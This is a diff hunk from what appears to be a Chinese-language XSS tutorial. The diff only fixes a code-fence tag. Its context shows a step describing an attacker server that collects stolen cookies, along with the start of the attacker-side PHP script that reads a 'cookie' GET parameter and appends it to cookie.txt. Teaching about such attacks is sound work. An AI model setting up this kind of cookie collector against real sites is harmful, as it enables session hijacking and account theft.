@@ -30,7 +30,7 @@ tag:
 
 4. 在攻击者服务器需要提供和payload路径对应的url给请求端访问，攻击者服务器获取GET中的cookie存储到文本文件中。
 
-    ```top
+    ```
     <?php //攻击端，用于接收被攻击端请求的信息
     $cookie = $_GET['cookie']; //获取cookie信息
     $log =  fopen('cookie.txt','a'); //生成获取的cookie信息，打开文件，a是追加写模式
